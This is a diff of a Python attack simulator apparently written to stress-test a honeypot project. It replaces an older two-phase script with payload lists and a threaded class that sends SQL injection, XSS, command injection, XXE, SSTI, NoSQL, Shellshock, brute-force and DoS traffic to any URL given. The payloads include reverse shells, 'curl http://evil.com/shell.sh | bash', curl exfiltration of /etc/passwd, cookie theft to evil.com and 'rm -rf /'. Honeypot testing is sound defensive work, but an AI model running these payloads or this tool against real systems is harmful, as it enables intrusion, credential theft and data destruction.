@@ -1,747 +1,681 @@
 #!/usr/bin/env python3
 """
-attack_simulator.py
-────────────────────
-Two-phase attack simulation for the Honeyport project:
+Attack Simulator - Comprehensive Honeypot Testing (ENHANCED)
+=============================================================
+Generates realistic, high-volume attack patterns to thoroughly test
+the honeypot's detection capabilities.
 
-  Phase A – HTTP attacks against the live Flask honeypot (port 5000)
-            Brute-force logins, scanner user-agents, path probes, SQLi payloads
+Attack Types:
+  1. SQL Injection (SQLi)            - 20+ payloads
+  2. Cross-Site Scripting (XSS)      - 15+ payloads
+  3. Brute Force Login               - Multiple credential combos
+  4. Directory Traversal             - Path manipulation
+  5. Command Injection               - OS command payloads
+  6. Port Scanning Behavior          - Endpoint enumeration
+  7. Bot/Crawler Activity            - Malicious bots
+  8. DoS Patterns                    - Rapid requests
+  9. PHP/WordPress Exploits          - CMS attacks
+ 10. Authentication Bypass           - Auth manipulation
+ 11. Shellshock (CVE-2014-6271)     - Legacy exploit
+ 12. XML External Entity (XXE)      - XML injection
+ 13. Server-Side Template Injection - Template exploits
+ 14. NoSQL Injection                - NoSQL attacks
 
-  Phase B – XGBoost model evaluation using CIC-IDS 2017 traffic profiles
-            Constructs realistic network-flow feature vectors for every attack
-            class the model was trained on, then runs them through the loaded
-            XGBoost classifier and prints detection results + SHAP explanation.
+Usage:
+  python3 attack_simulator.py --url https://your-ngrok-url.ngrok-free.dev --attacks 500 --parallel
 """
 
-import sys
+import argparse
+import random
 import time
-import json
 import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+from typing import List, Dict
+import urllib3
+import json
 
-HONEYPOT_URL = "http://localhost:5000"
+# Disable SSL warnings for testing
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ─── ANSI colours ────────────────────────────────────────────────────────────
-RED    = "\033[91m"
-GREEN  = "\033[92m"
-YELLOW = "\033[93m"
-CYAN   = "\033[96m"
-BOLD   = "\033[1m"
-RESET  = "\033[0m"
+# ═══════════════════════════════════════════════════════════════════════════
+# ATTACK PAYLOADS (SIGNIFICANTLY EXPANDED)
+# ═══════════════════════════════════════════════════════════════════════════
 
-def banner(msg, colour=CYAN):
-    width = 72
-    print(f"\n{colour}{BOLD}{'─'*width}{RESET}")
-    print(f"{colour}{BOLD}  {msg}{RESET}")
-    print(f"{colour}{BOLD}{'─'*width}{RESET}")
+SQL_INJECTION_PAYLOADS = [
+    # Basic SQLi
+    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "admin' --",
+    "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#", "' or 1=1/*",
 
-def result_line(label, value, ok=True):
-    icon  = f"{GREEN}✔{RESET}" if ok else f"{RED}✘{RESET}"
-    print(f"  {icon}  {BOLD}{label:<28}{RESET} {value}")
+    # UNION-based
+    "' UNION SELECT NULL--", "' UNION SELECT NULL, NULL--",
+    "' UNION SELECT @@version--", "' UNION SELECT user()--",
+    "' UNION SELECT database()--", "' UNION ALL SELECT 1,2,3,4,5--",
+    "-1' UNION SELECT 1,2,3,4,5,6,7,8--",
 
+    # Blind SQLi
+    "' AND 1=1--", "' AND 1=2--", "admin' AND SLEEP(5)--",
+    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  PHASE A  –  HTTP attack simulation
-# ═══════════════════════════════════════════════════════════════════════════════
+    # Boolean-based
+    "' OR 'x'='x", "' AND 'x'='x", "admin' AND '1'='1",
+    "' OR EXISTS(SELECT * FROM users)--",
 
-def phase_a():
-    banner("PHASE A  –  Live HTTP Attacks → Flask Honeypot (port 5000)")
+    # Error-based
+    "' AND 1=CONVERT(INT,(SELECT @@version))--",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
 
-    # ── A1: Brute-force login attempts ─────────────────────────────────────
-    print(f"\n{YELLOW}[A1] Brute-force login attempts{RESET}")
-    credentials = [
-        ("admin",  "admin"),
-        ("admin",  "password"),
-        ("root",   "toor"),
-        ("admin",  "admin123"),
-        ("user",   "password123"),
-        ("admin",  "letmein"),
-        ("test",   "test"),
-        ("admin",  "' OR '1'='1"),          # SQLi inside login
-    ]
-    for username, password in credentials:
+    # Stacked queries
+    "'; DROP TABLE users--", "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
+    "1; UPDATE users SET password='hacked'--",
+
+    # Advanced
+    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+    "admin' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
+]
+
+XSS_PAYLOADS = [
+    # Basic XSS
+    "<script>alert('XSS')</script>",
+    "<script>alert(1)</script>",
+    "<script>alert(document.cookie)</script>",
+
+    # Image-based
+    "<img src=x onerror=alert('XSS')>",
+    "<img src=x onerror=alert(document.cookie)>",
+    "<img src=javascript:alert('XSS')>",
+
+    # SVG-based
+    "<svg/onload=alert('XSS')>",
+    "<svg><script>alert(1)</script></svg>",
+
+    # Event handlers
+    "<body onload=alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus>",
+    "<select onfocus=alert(1) autofocus>",
+
+    # Encoded
+    "javascript:alert('XSS')",
+    "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+
+    # Data exfiltration
+    "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
+    "<img src=x onerror='new Image().src=\"http://evil.com/?c=\"+document.cookie'>",
+
+    # Filter bypass
+    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
+    "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
+    "<iframe src='javascript:alert(1)'>",
+]
+
+COMMAND_INJECTION_PAYLOADS = [
+    # Basic command injection
+    "; ls -la", "| cat /etc/passwd", "&& whoami", "|| id",
+
+    # Reverse shells
+    "| nc -e /bin/sh attacker.com 4444",
+    "; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
+    "| python -c 'import socket,subprocess,os;...'",
+
+    # File access
+    "`cat /etc/shadow`", "$(cat /etc/passwd)", "; cat /root/.ssh/id_rsa",
+
+    # Download & execute
+    "; curl http://evil.com/shell.sh | bash",
+    "| wget http://evil.com/backdoor.py && python backdoor.py",
+
+    # Destructive
+    "; rm -rf /", "&& chmod 777 /", "| dd if=/dev/zero of=/dev/sda",
+
+    # Exfiltration
+    "; curl -X POST -d @/etc/passwd http://evil.com/data",
+    "; tar -czf - /var/www | curl -X POST --data-binary @- http://evil.com/",
+]
+
+PATH_TRAVERSAL_PAYLOADS = [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "../../../../../../etc/hosts",
+    "../../../var/log/apache2/access.log",
+    "../../../../../../../../etc/shadow",
+    "../../../../../proc/self/environ",
+    "../../../../../../boot.ini",
+]
+
+XXE_PAYLOADS = [
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>',
+    '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>',
+]
+
+SSTI_PAYLOADS = [
+    # Jinja2/Flask
+    "{{7*7}}",
+    "{{config}}",
+    "{{config.items()}}",
+    "{{''.__class__.__mro__[1].__subclasses__()}}",
+
+    # Twig
+    "{{7*'7'}}",
+    "{{_self.env.registerUndefinedFilterCallback('exec')}}",
+
+    # FreeMarker
+    "${''.class.forName('java.lang.Runtime').getRuntime().exec('id')}",
+]
+
+NOSQL_INJECTION_PAYLOADS = [
+    '{"$ne": null}',
+    '{"$gt": ""}',
+    '{"username": {"$ne": null}, "password": {"$ne": null}}',
+    '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
+]
+
+COMMON_USERNAMES = [
+    "admin", "administrator", "root", "user", "test", "guest", "demo",
+    "Administrator", "postgres", "mysql", "oracle", "sa", "tomcat",
+    "webmaster", "ftpuser", "backup", "support", "admin123", "system",
+    "sysadmin", "superuser", "developer", "dbadmin"
+]
+
+COMMON_PASSWORDS = [
+    "password", "123456", "admin", "12345678", "password123", "admin123",
+    "root", "toor", "pass", "test", "guest", "changeme", "welcome",
+    "qwerty", "letmein", "monkey", "dragon", "master", "sunshine",
+    "secret", "password1", "123456789", "12345", "1234", "111111",
+    "Password1!", "Admin123!", "P@ssw0rd", "Welcome123"
+]
+
+MALICIOUS_USER_AGENTS = [
+    "sqlmap/1.7", "Nikto/2.1.6", "Nmap Scripting Engine",
+    "Metasploit/5.0", "Havij", "Acunetix/1.0", "ZmEu",
+    "Morfeus Scanner", "DirBuster-1.0", "Python-urllib/2.7",
+    "masscan/1.3.2", "dirbuster/1.0", "gobuster/3.5",
+    "Hydra/9.4", "w3af/2.0", "Burp Suite/2.0",
+    "() { :; }; /bin/bash -c 'wget http://evil.com/shell'",  # Shellshock
+]
+
+BOT_USER_AGENTS = [
+    "Mozilla/5.0 (compatible; Baiduspider/2.0)",
+    "Bytespider", "MJ12bot/v1.4.8", "AhrefsBot/7.0",
+    "SemrushBot/7.0", "DotBot/1.1", "Scrapy/2.5.0",
+    "PetalBot", "YandexBot/3.0"
+]
+
+EXPLOIT_PATHS = [
+    "/admin", "/administrator", "/wp-admin", "/wp-login.php",
+    "/phpmyadmin", "/phpMyAdmin", "/pma", "/mysql", "/db",
+    "/database", "/console", "/admin/login", "/admin/admin",
+    "/admin/index.php", "/admin/dashboard", "/cpanel", "/cgi-bin/",
+    "/shell.php", "/c99.php", "/r57.php", "/backup.sql", "/.env",
+    "/.git/config", "/config.php", "/wp-config.php", "/configuration.php",
+    "/config/database.yml", "/api/v1/auth", "/api/admin", "/.aws/credentials",
+    "/backup.zip", "/database.sql", "/.ssh/id_rsa"
+]
+
+# ═══════════════════════════════════════════════════════════════════════════
+# ATTACK SIMULATOR CLASS
+# ═══════════════════════════════════════════════════════════════════════════
+
+class AttackSimulator:
+    def __init__(self, base_url: str, verbose: bool = True):
+        self.base_url = base_url.rstrip('/')
+        self.verbose = verbose
+        self.session = requests.Session()
+        self.attack_count = 0
+        self.success_count = 0
+        self.attack_stats = {}
+
+    def log(self, msg: str, level: str = "INFO"):
+        if self.verbose:
+            timestamp = datetime.now().strftime("%H:%M:%S")
+            icons = {"INFO": "🎯", "SUCCESS": "✅", "ERROR": "❌", "WARN": "⚠️"}
+            print(f"[{timestamp}] {icons.get(level, '•')} {msg}")
+
+    def _make_request(self, method: str, path: str, data: dict = None,
+                     headers: dict = None, timeout: int = 5) -> bool:
+        """Make HTTP request and return success status"""
         try:
-            r = requests.post(
-                f"{HONEYPOT_URL}/login",
-                data={"username": username, "password": password},
-                timeout=5,
-            )
-            result_line(f"{username} / {password}", f"HTTP {r.status_code}")
-        except requests.exceptions.ConnectionError:
-            print(f"  {RED}[!] Honeypot unreachable at {HONEYPOT_URL}{RESET}")
-            return
-        time.sleep(0.1)
+            url = f"{self.base_url}{path}"
+            default_headers = {
+                "User-Agent": random.choice(MALICIOUS_USER_AGENTS + BOT_USER_AGENTS),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+            }
+            if headers:
+                default_headers.update(headers)
 
-    # ── A2: Scanner user-agents ────────────────────────────────────────────
-    print(f"\n{YELLOW}[A2] Scanner user-agent probes (/ endpoint){RESET}")
-    scanners = [
-        ("sqlmap/1.7",          "sqlmap automatic SQL injection"),
-        ("Nikto/2.1.6",         "Nikto web-server vulnerability scanner"),
-        ("Nmap Scripting Engine","Nmap NSE probe"),
-        ("masscan/1.3.2",       "masscan port scanner"),
-        ("dirbuster/1.0",       "DirBuster directory enumeration"),
-        ("gobuster/3.5",        "GoBuster directory/DNS brute-forcer"),
-        ("Hydra/9.4",           "Hydra login cracker"),
-    ]
-    for ua, description in scanners:
-        try:
-            r = requests.get(
-                f"{HONEYPOT_URL}/",
-                headers={"User-Agent": ua},
-                timeout=5,
-            )
-            result_line(description, f"HTTP {r.status_code}")
+            if method.upper() == "GET":
+                resp = self.session.get(url, headers=default_headers,
+                                       timeout=timeout, verify=False, allow_redirects=False)
+            else:
+                resp = self.session.post(url, data=data, headers=default_headers,
+                                        timeout=timeout, verify=False, allow_redirects=False)
+
+            self.attack_count += 1
+            if resp.status_code in [200, 301, 302, 400, 403, 404, 500]:
+                self.success_count += 1
+                return True
+            return False
+
+        except requests.exceptions.Timeout:
+            self.attack_count += 1
+            return False
         except Exception:
-            pass
-        time.sleep(0.05)
+            self.attack_count += 1
+            return False
 
-    # ── A3: High-value path probes ─────────────────────────────────────────
-    print(f"\n{YELLOW}[A3] High-value honeypot endpoint probes{RESET}")
-    paths = [
-        ("/admin",        "Admin panel probe"),
-        ("/wp-admin",     "WordPress admin probe"),
-        ("/phpmyadmin",   "phpMyAdmin probe"),
-        ("/api/v1/auth",  "API auth endpoint probe"),
+    def _track_attack(self, attack_type: str):
+        """Track attack statistics"""
+        self.attack_stats[attack_type] = self.attack_stats.get(attack_type, 0) + 1
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 1. SQL Injection Attacks
+    # ───────────────────────────────────────────────────────────────────────
+
+    def sql_injection_attack(self) -> bool:
+        """Simulate SQL injection attempts"""
+        payload = random.choice(SQL_INJECTION_PAYLOADS)
+        username = random.choice(["admin", "user", "test", "'admin'"])
+
+        data = {
+            "username": f"{username}{payload}" if random.random() > 0.3 else payload,
+            "password": random.choice(COMMON_PASSWORDS)
+        }
+
+        self.log(f"SQLi → {data['username'][:50]}")
+        self._track_attack("SQLi")
+        return self._make_request("POST", "/login", data=data)
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 2. Cross-Site Scripting (XSS)
+    # ───────────────────────────────────────────────────────────────────────
+
+    def xss_attack(self) -> bool:
+        """Simulate XSS attempts"""
+        payload = random.choice(XSS_PAYLOADS)
+
+        data = {
+            "username": payload,
+            "password": "password"
+        }
+
+        self.log(f"XSS → {payload[:50]}")
+        self._track_attack("XSS")
+        return self._make_request("POST", "/login", data=data)
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 3. Brute Force Attacks
+    # ───────────────────────────────────────────────────────────────────────
+
+    def brute_force_attack(self, attempts: int = 5) -> int:
+        """Simulate credential brute forcing"""
+        self.log(f"BruteForce → {attempts} attempts")
+        success = 0
+
+        username = random.choice(COMMON_USERNAMES)
+        for i in range(attempts):
+            password = random.choice(COMMON_PASSWORDS)
+            data = {"username": username, "password": password}
+
+            if self._make_request("POST", "/login", data=data):
+                success += 1
+
+            self._track_attack("BruteForce")
+            time.sleep(random.uniform(0.05, 0.3))
+
+        return success
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 4. Path Traversal
+    # ───────────────────────────────────────────────────────────────────────
+
+    def path_traversal_attack(self) -> bool:
+        """Simulate directory traversal attempts"""
+        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
+        path = f"/login?file={payload}"
+
+        self.log(f"PathTraversal → {payload[:40]}")
+        self._track_attack("PathTraversal")
+        return self._make_request("GET", path)
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 5. Command Injection
+    # ───────────────────────────────────────────────────────────────────────
+
+    def command_injection_attack(self) -> bool:
+        """Simulate OS command injection"""
+        payload = random.choice(COMMAND_INJECTION_PAYLOADS)
+
+        data = {
+            "username": f"admin{payload}",
+            "password": "test"
+        }
+
+        self.log(f"CmdInject → {payload[:40]}")
+        self._track_attack("CmdInject")
+        return self._make_request("POST", "/login", data=data)
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 6. Port Scanning Behavior
+    # ───────────────────────────────────────────────────────────────────────
+
+    def port_scan_attack(self, endpoints: int = 10) -> int:
+        """Simulate port scanning behavior"""
+        self.log(f"PortScan → probing {endpoints} endpoints")
+        success = 0
+
+        paths = random.sample(EXPLOIT_PATHS, min(endpoints, len(EXPLOIT_PATHS)))
+        headers = {"User-Agent": "Nmap Scripting Engine"}
+
+        for path in paths:
+            if self._make_request("GET", path, headers=headers, timeout=2):
+                success += 1
+            self._track_attack("PortScan")
+            time.sleep(random.uniform(0.01, 0.1))
+
+        return success
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 7. Bot Activity
+    # ───────────────────────────────────────────────────────────────────────
+
+    def bot_attack(self) -> bool:
+        """Simulate malicious bot activity"""
+        bot_ua = random.choice(BOT_USER_AGENTS)
+        headers = {"User-Agent": bot_ua}
+        path = random.choice(["/", "/login", "/admin", "/wp-admin"])
+
+        self.log(f"Bot → {bot_ua[:30]}")
+        self._track_attack("Bot")
+        return self._make_request("GET", path, headers=headers)
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 8. DoS Pattern (Rapid Requests)
+    # ───────────────────────────────────────────────────────────────────────
+
+    def dos_attack(self, count: int = 20) -> int:
+        """Simulate DoS by rapid repeated requests"""
+        self.log(f"DoS → {count} rapid requests")
+        success = 0
+
+        for i in range(count):
+            data = {"username": f"user{i}", "password": "test"}
+            if self._make_request("POST", "/login", data=data, timeout=2):
+                success += 1
+            self._track_attack("DoS")
+
+        return success
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 9. WordPress/PHP Exploits
+    # ───────────────────────────────────────────────────────────────────────
+
+    def wordpress_exploit_attack(self) -> bool:
+        """Simulate WordPress/PHP exploit attempts"""
+        wp_paths = [
+            "/wp-admin/install.php",
+            "/wp-content/plugins/",
+            "/xmlrpc.php",
+            "/wp-login.php?action=register",
+            "/wp-json/wp/v2/users",
+            "/wp-content/uploads/shell.php",
+        ]
+
+        path = random.choice(wp_paths)
+        self.log(f"WP-Exploit → {path}")
+        self._track_attack("WP-Exploit")
+        return self._make_request("GET", path)
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 10. Authentication Bypass
+    # ───────────────────────────────────────────────────────────────────────
+
+    def auth_bypass_attack(self) -> bool:
+        """Simulate authentication bypass attempts"""
+        bypass_payloads = [
+            {"username": "admin' or '1'='1' --", "password": "anything"},
+            {"username": "admin", "password": "' or '1'='1"},
+            {"username": "' or 1=1 --", "password": "' or 1=1 --"},
+            {"username": "admin'/*", "password": "*/OR/**/1=1#"},
+            {"username": json.dumps({"$ne": None}), "password": json.dumps({"$ne": None})},
+        ]
+
+        data = random.choice(bypass_payloads)
+        self.log(f"AuthBypass → {str(data['username'])[:40]}")
+        self._track_attack("AuthBypass")
+        return self._make_request("POST", "/login", data=data)
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 11. Shellshock (CVE-2014-6271)
+    # ───────────────────────────────────────────────────────────────────────
+
+    def shellshock_attack(self) -> bool:
+        """Simulate Shellshock exploit"""
+        headers = {
+            "User-Agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"
+        }
+
+        self.log("Shellshock → CVE-2014-6271")
+        self._track_attack("Shellshock")
+        return self._make_request("GET", "/login", headers=headers)
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 12. XXE (XML External Entity)
+    # ───────────────────────────────────────────────────────────────────────
+
+    def xxe_attack(self) -> bool:
+        """Simulate XXE injection"""
+        payload = random.choice(XXE_PAYLOADS)
+        headers = {"Content-Type": "application/xml"}
+
+        self.log("XXE → XML Entity Injection")
+        self._track_attack("XXE")
+        return self._make_request("POST", "/login", data=payload, headers=headers)
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 13. SSTI (Server-Side Template Injection)
+    # ───────────────────────────────────────────────────────────────────────
+
+    def ssti_attack(self) -> bool:
+        """Simulate SSTI attempts"""
+        payload = random.choice(SSTI_PAYLOADS)
+        data = {"username": payload, "password": "test"}
+
+        self.log(f"SSTI → {payload[:30]}")
+        self._track_attack("SSTI")
+        return self._make_request("POST", "/login", data=data)
+
+    # ───────────────────────────────────────────────────────────────────────
+    # 14. NoSQL Injection
+    # ───────────────────────────────────────────────────────────────────────
+
+    def nosql_injection_attack(self) -> bool:
+        """Simulate NoSQL injection"""
+        payload = random.choice(NOSQL_INJECTION_PAYLOADS)
+        headers = {"Content-Type": "application/json"}
+
+        data_dict = {"username": payload, "password": payload}
+        self.log(f"NoSQL → {payload[:30]}")
+        self._track_attack("NoSQL")
+        return self._make_request("POST", "/login", data=json.dumps(data_dict), headers=headers)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# ATTACK ORCHESTRATOR (ENHANCED)
+# ═══════════════════════════════════════════════════════════════════════════
+
+def run_attack_campaign(base_url: str, total_attacks: int = 500,
+                       parallel: bool = False, threads: int = 10):
+    """
+    Run comprehensive attack campaign with enhanced statistics
+    """
+
+    simulator = AttackSimulator(base_url)
+
+    print("\n" + "="*80)
+    print("🎭 ENHANCED ATTACK SIMULATOR - Honeypot Stress Testing")
+    print("="*80)
+    print(f"Target:         {base_url}")
+    print(f"Total Attacks:  {total_attacks}")
+    print(f"Mode:           {'Parallel' if parallel else 'Sequential'}")
+    if parallel:
+        print(f"Threads:        {threads}")
+    print("="*80 + "\n")
+
+    # Attack distribution (weighted)
+    attack_types = [
+        (simulator.sql_injection_attack, "SQLi", 22),
+        (simulator.xss_attack, "XSS", 12),
+        (lambda: simulator.brute_force_attack(10), "BruteForce", 18),
+        (simulator.path_traversal_attack, "PathTraversal", 8),
+        (simulator.command_injection_attack, "CmdInject", 10),
+        (lambda: simulator.port_scan_attack(15), "PortScan", 12),
+        (simulator.bot_attack, "Bot", 8),
+        (lambda: simulator.dos_attack(30), "DoS", 4),
+        (simulator.wordpress_exploit_attack, "WP-Exploit", 6),
+        (simulator.auth_bypass_attack, "AuthBypass", 6),
+        (simulator.shellshock_attack, "Shellshock", 2),
+        (simulator.xxe_attack, "XXE", 3),
+        (simulator.ssti_attack, "SSTI", 4),
+        (simulator.nosql_injection_attack, "NoSQL", 5),
     ]
-    for path, description in paths:
-        try:
-            r = requests.get(f"{HONEYPOT_URL}{path}", timeout=5)
-            result_line(description, f"HTTP {r.status_code} → {path}")
-        except Exception:
-            pass
-        time.sleep(0.05)
 
-    # ── A4: SQL injection / XSS payloads via query string ─────────────────
-    print(f"\n{YELLOW}[A4] SQL injection & XSS payloads in query string{RESET}")
-    payloads = [
-        ("?id=1' UNION SELECT 1,2,3--",         "UNION-based SQLi"),
-        ("?search=<script>alert(1)</script>",   "Reflected XSS"),
-        ("?user=admin'--",                       "Comment-based SQLi"),
-        ("?q=1%27%20OR%20%271%27%3D%271",       "URL-encoded SQLi"),
-    ]
-    for qs, description in payloads:
-        try:
-            r = requests.get(f"{HONEYPOT_URL}/{qs}", timeout=5)
-            result_line(description, f"HTTP {r.status_code}")
-        except Exception:
-            pass
-        time.sleep(0.05)
+    # Build attack plan
+    total_weight = sum(weight for _, _, weight in attack_types)
+    attack_plan = []
 
-    # ── Show how many events were logged ──────────────────────────────────
-    try:
-        with open("logs/honeypot_logs.json") as fh:
-            count = sum(1 for line in fh if line.strip())
-        print(f"\n  {GREEN}Total events logged to honeypot_logs.json: {BOLD}{count}{RESET}")
-    except FileNotFoundError:
-        pass
+    for attack_fn, name, weight in attack_types:
+        count = int((weight / total_weight) * total_attacks)
+        attack_plan.extend([attack_fn] * count)
 
+    # Shuffle for realistic mixed attack pattern
+    random.shuffle(attack_plan)
+    attack_plan = attack_plan[:total_attacks]
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  PHASE B  –  XGBoost model evaluation with CIC-IDS traffic profiles
-# ═══════════════════════════════════════════════════════════════════════════════
+    start_time = time.time()
 
-# ── CIC-IDS 2017 representative feature profiles ──────────────────────────────
-# Each dict maps every feature_name the model expects → a realistic float value.
-# Values are based on published CIC-IDS 2017 dataset statistics.
-# Protocol: 6=TCP, 17=UDP, 0=other
+    # Execute attacks
+    if parallel:
+        print(f"⚡ Running {len(attack_plan)} attacks in parallel with {threads} threads...\n")
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(attack_fn) for attack_fn in attack_plan]
 
-def _make_base():
-    """Return a zeroed feature dict for all 77 features."""
-    return {
-        "Protocol": 6.0,
-        "Flow Duration": 0.0,
-        "Total Fwd Packets": 0.0,
-        "Total Backward Packets": 0.0,
-        "Fwd Packets Length Total": 0.0,
-        "Bwd Packets Length Total": 0.0,
-        "Fwd Packet Length Max": 0.0,
-        "Fwd Packet Length Min": 0.0,
-        "Fwd Packet Length Mean": 0.0,
-        "Fwd Packet Length Std": 0.0,
-        "Bwd Packet Length Max": 0.0,
-        "Bwd Packet Length Min": 0.0,
-        "Bwd Packet Length Mean": 0.0,
-        "Bwd Packet Length Std": 0.0,
-        "Flow Bytes/s": 0.0,
-        "Flow Packets/s": 0.0,
-        "Flow IAT Mean": 0.0,
-        "Flow IAT Std": 0.0,
-        "Flow IAT Max": 0.0,
-        "Flow IAT Min": 0.0,
-        "Fwd IAT Total": 0.0,
-        "Fwd IAT Mean": 0.0,
-        "Fwd IAT Std": 0.0,
-        "Fwd IAT Max": 0.0,
-        "Fwd IAT Min": 0.0,
-        "Bwd IAT Total": 0.0,
-        "Bwd IAT Mean": 0.0,
-        "Bwd IAT Std": 0.0,
-        "Bwd IAT Max": 0.0,
-        "Bwd IAT Min": 0.0,
-        "Fwd PSH Flags": 0.0,
-        "Bwd PSH Flags": 0.0,
-        "Fwd URG Flags": 0.0,
-        "Bwd URG Flags": 0.0,
-        "Fwd Header Length": 0.0,
-        "Bwd Header Length": 0.0,
-        "Fwd Packets/s": 0.0,
-        "Bwd Packets/s": 0.0,
-        "Packet Length Min": 0.0,
-        "Packet Length Max": 0.0,
-        "Packet Length Mean": 0.0,
-        "Packet Length Std": 0.0,
-        "Packet Length Variance": 0.0,
-        "FIN Flag Count": 0.0,
-        "SYN Flag Count": 0.0,
-        "RST Flag Count": 0.0,
-        "PSH Flag Count": 0.0,
-        "ACK Flag Count": 0.0,
-        "URG Flag Count": 0.0,
-        "CWE Flag Count": 0.0,
-        "ECE Flag Count": 0.0,
-        "Down/Up Ratio": 0.0,
-        "Avg Packet Size": 0.0,
-        "Avg Fwd Segment Size": 0.0,
-        "Avg Bwd Segment Size": 0.0,
-        "Fwd Avg Bytes/Bulk": 0.0,
-        "Fwd Avg Packets/Bulk": 0.0,
-        "Fwd Avg Bulk Rate": 0.0,
-        "Bwd Avg Bytes/Bulk": 0.0,
-        "Bwd Avg Packets/Bulk": 0.0,
-        "Bwd Avg Bulk Rate": 0.0,
-        "Subflow Fwd Packets": 0.0,
-        "Subflow Fwd Bytes": 0.0,
-        "Subflow Bwd Packets": 0.0,
-        "Subflow Bwd Bytes": 0.0,
-        "Init Fwd Win Bytes": 0.0,
-        "Init Bwd Win Bytes": 0.0,
-        "Fwd Act Data Packets": 0.0,
-        "Fwd Seg Size Min": 20.0,
-        "Active Mean": 0.0,
-        "Active Std": 0.0,
-        "Active Max": 0.0,
-        "Active Min": 0.0,
-        "Idle Mean": 0.0,
-        "Idle Std": 0.0,
-        "Idle Max": 0.0,
-        "Idle Min": 0.0,
-    }
+            completed = 0
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                    completed += 1
+                    if completed % 50 == 0:
+                        print(f"   Progress: {completed}/{len(attack_plan)} attacks completed")
+                except Exception as e:
+                    pass
+    else:
+        print(f"🔄 Running {len(attack_plan)} attacks sequentially...\n")
+        for i, attack_fn in enumerate(attack_plan):
+            try:
+                attack_fn()
+                if (i + 1) % 50 == 0:
+                    print(f"   Progress: {i+1}/{len(attack_plan)} attacks completed")
+                time.sleep(random.uniform(0.1, 0.5))
+            except Exception:
+                pass
 
-ATTACK_PROFILES = {
+    elapsed = time.time() - start_time
 
-    # ── PortScan ─────────────────────────────────────────────────────────────
-    # Real CIC-IDS 2017 PortScan values extracted from dataset (97% confidence).
-    # Characteristic: moderate duration, small Init Bwd Win Bytes (243),
-    # low Fwd Packet Length Mean, sparse bidirectional traffic.
-    "PortScan": {
-        **_make_base(),
-        "Protocol": 6.0,
-        "Flow Duration": 5_021_059.0,      # ~5 s
-        "Total Fwd Packets": 6.0,
-        "Total Backward Packets": 5.0,
-        "Fwd Packets Length Total": 703.0,
-        "Bwd Packets Length Total": 1414.0,
-        "Fwd Packet Length Max": 356.0,
-        "Fwd Packet Length Min": 0.0,
-        "Fwd Packet Length Mean": 117.17,
-        "Fwd Packet Length Std": 181.54,
-        "Bwd Packet Length Max": 1050.0,
-        "Bwd Packet Length Min": 0.0,
-        "Bwd Packet Length Mean": 282.8,
-        "Bwd Packet Length Std": 456.92,
-        "Flow Bytes/s": 421.62,
-        "Flow Packets/s": 2.19,
-        "Fwd Packets/s": 1.19,
-        "Bwd Packets/s": 1.00,
-        "Flow IAT Mean": 502_105.9,
-        "Flow IAT Std": 1_568_379.1,
-        "Flow IAT Max": 4_965_658.0,
-        "Flow IAT Min": 19.0,
-        "Fwd IAT Total": 55_401.0,
-        "Fwd IAT Mean": 11_080.0,
-        "Fwd IAT Std": 17_612.0,
-        "Fwd IAT Max": 41_863.0,
-        "Fwd IAT Min": 19.0,
-        "Bwd IAT Total": 5_020_928.0,
-        "Bwd IAT Mean": 1_255_232.0,
-        "Bwd IAT Std": 2_499_939.5,
-        "Bwd IAT Max": 5_005_133.0,
-        "Bwd IAT Min": 1_053.0,
-        "Fwd Header Length": 200.0,
-        "Bwd Header Length": 168.0,
-        "Packet Length Min": 0.0,
-        "Packet Length Max": 1050.0,
-        "Packet Length Mean": 176.42,
-        "Packet Length Std": 317.47,
-        "Packet Length Variance": 100_787.9,
-        "PSH Flag Count": 1.0,
-        "Avg Packet Size": 192.45,
-        "Avg Fwd Segment Size": 117.17,
